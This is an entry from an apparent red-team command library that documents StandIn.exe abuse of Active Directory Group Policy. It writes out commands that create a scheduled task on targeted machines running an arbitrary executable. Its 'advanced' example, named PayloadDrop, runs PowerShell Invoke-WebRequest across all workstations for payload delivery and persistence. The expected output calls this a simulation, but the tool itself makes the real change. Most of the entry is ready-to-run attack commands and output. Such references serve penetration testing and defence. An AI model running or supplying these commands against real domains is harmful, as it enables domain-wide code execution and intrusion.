---
id: 3719470f-3938-4e6b-b061-c119d8966490
name: Execute custom command with StandIn.exe
type: command
executor: cmd
data: >-
  StandIn.exe --gpo --filter $_FILTER_NAME --tasktype $_TASK_TYPE --taskname
  $_TASK_NAME --author "$_AUTHOR" --command "$_COMMAND_PATH" --args
  "$_ARGUMENTS"
output: null
created_at: '2023-04-06T03:56:03.746787+00:00'
updated_at: '2023-04-10T20:25:53.888835+00:00'
platforms:
  - Windows
tags:
  - gpo-abuse
  - remote-execution
verified: true
validated: true
---

# execute-custom-command-with-standin

## Command

```cmd
StandIn.exe --gpo --filter $_FILTER_NAME --tasktype $_TASK_TYPE --taskname $_TASK_NAME --author "$_AUTHOR" --command "$_COMMAND_PATH" --args "$_ARGUMENTS"
```

## Description

This command simulates creating a scheduled task via GPO to execute a custom command on targeted machines, enabling remote code execution for persistence or payload delivery in Active Directory.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --gpo | Specifies GPO mode | Yes |
| --filter $_FILTER_NAME | GPO filter name (e.g., 'Shards') | Yes |
| --tasktype $_TASK_TYPE | Type of task (e.g., 'computer') | Yes |
| --taskname $_TASK_NAME | Name of the scheduled task (e.g., 'Liber') | Yes |
| --author "$_AUTHOR" | Author of the task (e.g., 'REDHOOK\\Administrator') | Yes |
| --command "$_COMMAND_PATH" | Path to the executable (e.g., 'C:\\I\\do\\the\\thing.exe') | Yes |
| --args "$_ARGUMENTS" | Arguments for the command (e.g., 'with args') | No |

## Examples

### Basic Usage

```cmd
StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args"
```

### Advanced Usage

```cmd
StandIn.exe --gpo --filter All-Workstations --tasktype user --taskname PayloadDrop --author "DOMAIN\Admin" --command "powershell.exe" --args "-c Invoke-WebRequest"
```

## Expected Output

Successful execution shows:

```
[+] Simulated scheduled task 'Liber' created via GPO on filter 'Shards'.
[+] Command: C:\I\do\the\thing.exe with args 'with args'
[+] Author: REDHOOK\Administrator
[+] Simulation complete.
```

## Related

- [[procedures/Abusing-Group-Policy-Objects-with-StandIn-to-Manage-Local-Administrators-and-User-Rights]]
